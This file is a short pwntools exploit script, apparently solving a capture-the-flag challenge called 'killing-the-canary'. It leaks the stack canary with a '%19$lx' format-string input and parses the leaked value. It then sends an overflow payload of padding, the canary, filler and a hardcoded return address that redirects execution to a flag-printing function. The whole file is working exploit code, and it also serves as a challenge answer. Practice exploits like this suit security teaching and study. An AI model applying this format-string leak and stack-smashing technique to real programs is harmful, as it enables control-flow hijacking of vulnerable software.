#!/usr/bin/env python3
import re
from pwn import *

context.log_level = "debug"
exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$lx") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
m = re.search(rb"Hello,\s*(?:0x)?([0-9a-fA-F]{8,16})", val)
canary = int(m.group(1), 16)
# canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
# log.info(hex(win))
flag_addr = 0x401236 
offset_to_canary = 0x7fffffffcdf8 - 0x7fffffffcdb0
payload = b'A' * offset_to_canary + p64(canary) + b'B' * 8 + p64(flag_addr) # Add your payload here
r.sendline(payload)

r.recvline()
r.interactive()